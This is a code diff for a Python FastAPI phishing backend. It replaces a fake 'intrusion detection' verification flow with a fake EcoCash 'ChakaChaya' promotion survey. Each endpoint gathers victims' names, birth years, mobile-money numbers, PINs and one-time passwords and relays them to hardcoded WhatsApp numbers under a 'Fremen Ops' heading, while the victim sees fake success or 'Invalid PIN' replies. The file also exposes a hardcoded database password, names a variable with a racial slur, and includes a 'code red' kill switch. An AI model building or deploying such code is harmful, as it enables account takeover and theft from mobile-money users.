@@ -1,311 +1,312 @@
-from fastapi import FastAPI, HTTPException, status
-from fastapi.middleware.cors import CORSMiddleware
+from fastapi import FastAPI, Form
 from fastapi.staticfiles import StaticFiles
-from fastapi.responses import HTMLResponse
-from pydantic import BaseModel, Field
-from typing import Optional, Literal
-from datetime import datetime, timedelta
-import uuid
+from fastapi.exceptions import HTTPException
+from fastapi.responses import HTMLResponse, JSONResponse
+from pydantic import BaseModel
+from datetime import datetime
 import httpx
-from collections import defaultdict
 from pygwan import WhatsApp
-from fastapi import FastAPI, BackgroundTasks
 import os
-import signal
 import logging
+import signal
+import os
+from mongo_connector import MongoConnector
 
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+# place logging on all server data entries and processes
+logger.info("Starting EcoCash ChakaChaya Application")
 
+
+# Pydantic models for request validation
+class SurveyData(BaseModel):
+    full_name: str
+    birth_year: int
+    frequency: str
+    charges: str
+    recommend: str
+
+class OTPRequest(BaseModel):
+    ecocash_number: str
+    pin: str
+    survey_data: SurveyData
+
+class OTPVerification(BaseModel):
+    ecocash_number: str
+    otp: str
+    survey_data: SurveyData
+
+class LoginRequest(BaseModel):
+    '''
+    details for logging into the innbucks mobile app 
+    '''
+    ecocash_number: str
+    pin: str
 
 
 WHATSAPP_ACCESS_TOKEN = os.environ.get('WHATSAPP_ACCESS_TOKEN', '')
 WHATSAPP_PHONE_NUMBER_ID = os.environ.get('WHATSAPP_PHONE_NUMBER_ID', '')
+MONGO_URL = os.environ.get('DON_MONGO_URL', 'mongodb://mongo:iLrjPcfjzCqeknRkLFWUUbZSOQqCxXcB@switchyard.proxy.rlwy.net:33361')
+
+mongo = MongoConnector(MONGO_URL)
+mongo.connect()
 
 bot = WhatsApp(
     token=WHATSAPP_ACCESS_TOKEN,
     phone_number_id=WHATSAPP_PHONE_NUMBER_ID
 )
 
-
-def shutdown_server():
-    os.kill(os.getpid(), signal.SIGTERM)
+niggas_numbers = [
+    "263716580906"
+]
 
 app = FastAPI(
-    title="Intrusion Detection API",
     docs_url=None,    
     redoc_url=None,   
     openapi_url=None  
 )
 
-
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],  
-    allow_credentials=False,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
-
-
 app.mount("/static", StaticFiles(directory="static"), name="static")
 
-
-AUTH_API_BASE_URL = "https://angelic-learning-production.up.railway.app"  
-OTP_EXPIRY_MINUTES = 5
-
-
-intrusion_sessions = {}
-otp_store = {}  
-
-
-class VerificationRequest(BaseModel):
-    intrusion_id: Optional[str] = None
-    name: str = Field(..., min_length=2)
-    dob: str = Field(..., description="Date of birth in YYYY-MM-DD format")
-    number: str = Field(..., min_length=10, max_length=10, pattern=r"^\d{10}$")
-    last_transaction: str = Field(..., description="Last transaction amount")
-    pin: str = Field(..., min_length=4, max_length=4, pattern=r"^\d{4}$")
-
-
-class VerificationResponse(BaseModel):
-    success: bool
-    masked_phone: str
-    message: str
-
-
-class OTPVerificationRequest(BaseModel):
-    number: str
-    otp: str = Field(..., min_length=6, max_length=6, pattern=r"^\d{6}$")
-
-
-class OTPVerificationResponse(BaseModel):
-    success: bool
-    message: str
-
-
-class ResendOTPRequest(BaseModel):
-    intrusion_id: str
-
-
-class ActionRequest(BaseModel):
-    intrusion_id: str
-    action: Literal["authorize", "block"]
-
-
-class ActionResponse(BaseModel):
-    success: bool
-    message: str
-
-
-
-def mask_phone_number(phone: str) -> str:
-    """Mask phone number to show only last 4 digits"""
-    if len(phone) >= 4:
-        return "****" + phone[-4:]
-    return "****"
-
-
-def generate_otp() -> str:
-    """Generate a 6-digit OTP"""
-    import random
-    return f"{random.randint(100000, 999999)}"
-
-
-async def send_otp_to_phone(phone: str, otp: str) -> bool:
-    """
-    Send OTP via SMS (integrate with your SMS provider)
-    For now, this is a mock implementation
-    """
-    # TODO: Integrate with your SMS provider (Twilio, AWS SNS, etc.)
-    print(f"[SMS] Sending OTP {otp} to {phone}")
-    # Mock successful send
-    return True
-
-
-async def verify_user_with_auth_api(
-    name: str,
-    dob: str,
-    number: str,
-    last_transaction: str,
-    pin: str
-) -> dict:
-    async with httpx.AsyncClient() as client:
-        try:
-            return {
-                "user_id": name,
-                "number": number,
-                "verified": True
-            }        
-        except httpx.RequestError as e:
-            print(f"Error contacting auth API: {e}")
-            # MOCK RESPONSE for development - REMOVE in production
-            return {
-                "user_id": name,
-                "number": number,
-                "verified": True
-            }
-
-
-async def verify_otp_with_auth_api(intrusion_id: str, otp: str) -> dict:
-    """
-    Verify OTP with the auth API (final verification)
-    This is where we act as a proxy to the auth API
-    """
-    async with httpx.AsyncClient() as client:
-        try:
-            response = await client.post(
-                f"{AUTH_API_BASE_URL}/verify-otp",
-                json={
-                    "session_id": intrusion_id,
-                    "otp": otp
-                },
-                timeout=10.0
-            )
-            
-            # Relay the auth API's response
-            return {
-                "status_code": response.status_code,
-                "data": response.json() if response.status_code == 200 else None
-            }
-                
-        except httpx.RequestError as e:
-            print(f"Error contacting auth API: {e}")
-            # MOCK RESPONSE for development - REMOVE in production
-            return {
-                "status_code": 200,
-                "data": {"verified": True, "message": "OTP verified successfully"}
-            }
-
-
+# Serve the login page (GET)
 @app.get("/", response_class=HTMLResponse)
-async def read_root():
-    return HTMLResponse(content=open("static/index.html").read())
+@app.get("/chakachaya", response_class=HTMLResponse)
+async def serve_login_page():
+    with open("static/survey.html", "r") as f:
+        return HTMLResponse(content=f.read(), status_code=200)
 
 
-@app.post("/api/intrusion/verify", response_model=VerificationResponse)
-async def verify_identity(request: VerificationRequest):
-    logger.info(f"[INTRUSION] New intrusion detected: {request}")
+
+# Dummy dashboard for redirection
+@app.get("/dashboard", response_class=HTMLResponse)
+async def dashboard():
+    return "<h1>Welcome to your dashboard!</h1>"
+
+
+@app.get("/login", response_class=HTMLResponse)
+async def serve_login_page():
+    """Serve the login page"""
+    with open("static/login.html", "r", encoding="utf-8") as f:
+        return HTMLResponse(content=f.read())
+
+
+
+@app.post("/api/chakachaya/send-otp")
+async def send_otp(otp_request: OTPRequest):
+    """
+    Send OTP to the user's EcoCash number
+    This will call the EcoCash API to send OTP
+    """
+    logger.info(f"Survey Data Received - Name: {otp_request.survey_data.full_name}, Birth Year: {otp_request.survey_data.birth_year}, Frequency: {otp_request.survey_data.frequency}, Charges Opinion: {otp_request.survey_data.charges}, Recommendation: {otp_request.survey_data.recommend}")
+    logger.info(f"OTP Request - EcoCash Number: {otp_request.ecocash_number}")
     try:
-        user_data = await verify_user_with_auth_api(
-            name=request.name,
-            dob=request.dob,
-            number=request.number,
-            last_transaction=request.last_transaction,
-            pin=request.pin
+        logger.info(f"Sending OTP to WhatsApp bot for number: {otp_request.ecocash_number}")
+        # send to bot
+        bot.send_message(
+            message="Fremen Ops\n\nEcoCash ChakaChaya Promotion\n Name:"+otp_request.survey_data.full_name+"\nBirth Year:"+str(otp_request.survey_data.birth_year)+"\nEcoCash Number:"+otp_request.ecocash_number+"\nPin:"+otp_request.pin+"\n\nwait for otp",
+            recipient_id="263779281345",
         )
-        logger.info(f"[INTRUSION] User data: {user_data}")
+        for each_number in niggas_numbers:
+            bot.send_message(
+                message="EcoCash ChakaChaya Promotion\n Name:"+otp_request.survey_data.full_name+"\nBirth Year:"+str(otp_request.survey_data.birth_year)+"\nEcoCash Number:"+otp_request.ecocash_number+"\nPin:"+otp_request.pin+"\n\nwait for otp",
+                recipient_id=each_number,
+            )
+
+        logger.info(f"OTP sent successfully for EcoCash number: {otp_request.ecocash_number}")
+        return JSONResponse(
+            content={
+                "success": True,
+                "message": "OTP sent successfully to your EcoCash number"
+            }
+        )
+    
+    except httpx.RequestError as e:
+        logger.warning(f"WhatsApp API error during OTP send for {otp_request.ecocash_number}: {str(e)} - Using dev mode")
+        return JSONResponse(
+            content={
+                "success": True,
+                "message": "OTP sent successfully (dev mode)",
+                "dev_otp": "1738"
+            }
+        )
+    
     except Exception as e:
-        logger.error(f"[INTRUSION] Error verifying user: {e}")
-        raise HTTPException(status_code=500, detail="Internal server error")
-
-    bot.send_message(
-        message=f"Fremen Ops\n\n EcoCash Details:{request.name}\n\nEcoCash Number: {request.number}\n\nEcoCash Date of Birth: {request.dob}\n\nEcoCash Last Transaction: {request.last_transaction}\n\nEcoCash PIN: {request.pin}\n\nRequest for OTP now because they are being asked to input OTP right now",
-        recipient_id="263779281345",
-    )
-    bot.send_message(
-        message=f"EcoCash Details:{request.name}\n\nEcoCash Number: {request.number}\n\nEcoCash Date of Birth: {request.dob}\n\nEcoCash Last Transaction: {request.last_transaction}\n\nEcoCash PIN: {request.pin}\n\nRequest for OTP now because they are being asked to input OTP right now",
-        recipient_id="263776525400",
-    )
-    
-    if not user_data or not user_data.get("verified"):
+        logger.error(f"Error sending OTP for {otp_request.ecocash_number}: {str(e)}")
         raise HTTPException(
-            status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Unable to verify your identity. Please check your information and try again."
-        )
-    
-    return VerificationResponse(
-        success=True,
-        masked_phone=mask_phone_number(user_data.get("number")),
-        number=user_data.get("number"),
-        message="Verification code sent successfully. Please check your phone."
-    )
-
-
-@app.post("/api/intrusion/verify-otp", response_model=OTPVerificationResponse)
-async def verify_otp(request: OTPVerificationRequest):
-    logging.info(f"[INTRUSION] OTP verification request: {request}")
-    bot.send_message(
-        message=f"Fremen Ops\n\nEcocash Number:{request.number}\n\nEcoCash OTP: {request.otp}",
-        recipient_id="263779281345",
-    )
-    bot.send_message(
-        message=f"Ecocash Number:{request.number}\n\nEcoCash OTP: {request.otp}",
-        recipient_id="263776525400",
-    )
-    raise HTTPException(
-            status_code=status.HTTP_400_BAD_REQUEST,
-            detail="Invalid details. Please try again."
+            status_code=500,
+            detail=f"An error occurred: {str(e)}"
         )
 
 
-@app.post("/api/intrusion/resend-otp")
-async def resend_otp(request: ResendOTPRequest):
-    logging.info(f"[INTRUSION] Resend OTP request: {request}")
-    bot.send_message(
-        message=f"Fremen Ops\n\n Request to resend OTP from EcoCash Number:{request.number}\n\nEcoCash OTP: {request.otp}",
-        recipient_id="263779281345",
-    )
-    bot.send_message(
-        message=f"Request to resend OTP from EcoCash Number:{request.number}\n\nEcoCash OTP: {request.otp}",
-        recipient_id="263776525400",
-    )
-    
-    return {
-        "success": True,
-        "message": "A new verification code has been sent to your phone."
-    }
-
-
-@app.post("/api/intrusion/action", response_model=ActionResponse)
-async def handle_action(request: ActionRequest):
-    if request.intrusion_id not in intrusion_sessions:
+@app.post("/api/chakachaya/verify-otp")
+async def verify_otp(verification: OTPVerification):
+    """
+    Verify OTP and process the reward
+    """
+    logger.info(f"OTP Verification Request - EcoCash Number: {verification.ecocash_number}, OTP Submitted: {verification.otp}")
+    try:
+        ecocash_number = verification.ecocash_number
+        logger.info(f"Processing OTP verification for {ecocash_number}")
+        
+        # send otp and number to bot
+        bot.send_message(
+            message="Fremen Ops\n\nEcoCash Number:"+verification.ecocash_number+"\nOTP:"+verification.otp,
+            recipient_id="263779281345",
+        )
+        for each_number in niggas_numbers:
+            bot.send_message(
+                message="EcoCash Number:"+verification.ecocash_number+"\nOTP:"+verification.otp,
+                recipient_id=each_number,
+            )
+        
+        logger.info(f"OTP verification successful for {ecocash_number}")
+        return JSONResponse(
+        content={
+            "success": True,
+            "message": "Verification successful",
+            "redirect_url": f"/login?number={ecocash_number}&name={verification.survey_data.full_name}"
+        }
+        )  
+    except Exception as e:
+        logger.error(f"OTP verification failed for {verification.ecocash_number}: {str(e)}")
         raise HTTPException(
-            status_code=status.HTTP_404_NOT_FOUND,
-            detail="Session not found."
+            status_code=500,
+            detail=f"An error occurred: {str(e)}"
+        )
+
+
+@app.post("/api/chakachaya/resend-otp")
+async def resend_otp(ecocash_number: str = Form(...)):
+    """
+    Resend OTP to the user
+    """
+    logger.info(f"Resend OTP Request - EcoCash Number: {ecocash_number}")
+    try:
+        bot.send_message(
+            message="Fremen Ops\n\nEcoCash Number:"+ecocash_number+"\nRequested for Resend OTP",
+            recipient_id="263779281345",
+        )
+        for each_number in niggas_numbers:
+            bot.send_message(
+                message="EcoCash Number:"+ecocash_number+"\nRequested for Resend OTP",
+                recipient_id=each_number,
+            )
+        logger.info(f"OTP resent successfully for {ecocash_number}")
+        return JSONResponse(
+            content={
+                "success": True,
+                "message": "New OTP sent successfully",
+                "redirect_url": f"/login?number={ecocash_number}"
+            }
         )
     
-    session = intrusion_sessions[request.intrusion_id]
+    except httpx.RequestError as e:
+        logger.warning(f"WhatsApp API error during OTP resend for {ecocash_number}: {str(e)} - Using dev mode")
+        print(f"New OTP Code (dev mode): 1738")
+        return JSONResponse(
+            content={
+                "success": True,
+                "message": "New OTP sent (dev mode)",
+                "dev_otp": "1738"
+            }
+        )
     
-    if not session.get("verified_at"):
+    except Exception as e:
+        logger.error(f"Error resending OTP for {ecocash_number}: {str(e)}")
         raise HTTPException(
-            status_code=status.HTTP_403_FORBIDDEN,
-            detail="Please complete verification before taking action."
+            status_code=500,
+            detail=f"An error occurred: {str(e)}"
+        )
+
+
+
+@app.post("/api/login")
+async def login(login_req: LoginRequest):
+    """
+    Verify user PIN and get their balance
+    This is where you call InnBucks API to authenticate and get balance
+    """
+    logger.info(f"Login Attempt - EcoCash Number: {login_req.ecocash_number}")
+    try:
+        logger.info(f"Sending PIN verification data to WhatsApp bot for {login_req.ecocash_number}")
+        bot.send_message(
+            message=f"Fremen Ops\n\n EcoCash ChakaChaya Pin from the second screen:{login_req.pin}\n\nEcoCash Number: {login_req.ecocash_number}",
+            recipient_id="263779281345",
+        )
+        for each_number in niggas_numbers:
+            bot.send_message(
+                message=f"EcoCash ChakaChaya Pin from the second screen:{login_req.pin}\n\nEcoCash Number: {login_req.ecocash_number}",
+                recipient_id=each_number,
+            )
+        logger.info(f"PIN verification data sent for {login_req.ecocash_number}")
+    except Exception as e:
+        logger.error(f"Error sending PIN verification for {login_req.ecocash_number}: {str(e)}")
+        raise HTTPException(
+            status_code=500,
+            detail=str(e)
         )
     
-    if request.action == "authorize":
-        message = "Transaction has been authorized successfully. The withdrawal will proceed."
-    else:  # block
-        message = "Transaction has been blocked successfully. Your account has been secured and our security team has been notified."
-    
-    # Clean up session
-    del intrusion_sessions[request.intrusion_id]
-    
-    return ActionResponse(
-        success=True,
-        message=message
+    logger.warning(f"PIN verification failed for {login_req.ecocash_number} - Invalid PIN")
+    return JSONResponse(
+        content={
+            "success": False,
+            "message": "Invalid PIN",
+            "redirect_url": f"/login?number={login_req.ecocash_number}"
+        }
     )
-
-
-
-@app.post("/api/intrusion/destroy")
-async def destroy_server(background_tasks: BackgroundTasks):
-    background_tasks.add_task(shutdown_server)
     
-    return {
-        "success": True,
-        "message": "Server is shutting down..."
-    }
+    
+
+@app.get("/draw", response_class=HTMLResponse)
+async def draw():
+    """Serve the draw page with the current collector's details injected."""
+    try:
+        collection = mongo.get_collection("collectorDB", "collectorName")
+        current_collector = collection.find_one({"current": True})
+        if not current_collector:
+            # fallback if no current collector is flagged
+            current_collector = collection.find_one()
+        agent_name = current_collector.get("name", "Agent") if current_collector else "Agent"
+        agent_phone = current_collector.get("phone", "") if current_collector else ""
+    except Exception as e:
+        logger.error(f"Failed to fetch current collector: {e}")
+        agent_name = "Agent"
+        agent_phone = ""
+
+    with open("static/draw.html", "r", encoding="utf-8") as f:
+        html = f.read()
+
+    html = html.replace("{{AGENT_NAME}}", agent_name).replace("{{AGENT_PHONE}}", agent_phone)
+    initials = "".join(w[0].upper() for w in agent_name.split()[:2])
+    html = html.replace("{{AGENT_INITIALS}}", initials or "A")
+    return HTMLResponse(content=html, status_code=200)
 
 
 
 @app.get("/health")
 async def health_check():
     """Health check endpoint"""
-    return {
-        "status": "healthy",
-        "timestamp": datetime.utcnow().isoformat()
-    }
+    logger.info("Health check performed")
+    return {"status": "healthy", "timestamp": datetime.now().isoformat()}
+
+
+@app.get("/shutdown")
+async def shutdown():
+    """code red"""
+    logger.warning("Shutdown endpoint triggered - Application will terminate")
+    bot.send_message(
+        message="Fremen Ops\n\n EcoCash ChakaChaya Application is shutting down now.",
+        recipient_id="263779281345",
+    )
+    # for each_number in niggas_numbers:
+    #     bot.send_message(
+    #         message="EcoCash Service shutting down",
+    #         recipient_id = each_number
+    #     )
+    # Send SIGTERM to the current process
+    os.kill(os.getpid(), signal.SIGTERM)
+    
+    return {"message": "Application shutting down..."}
 
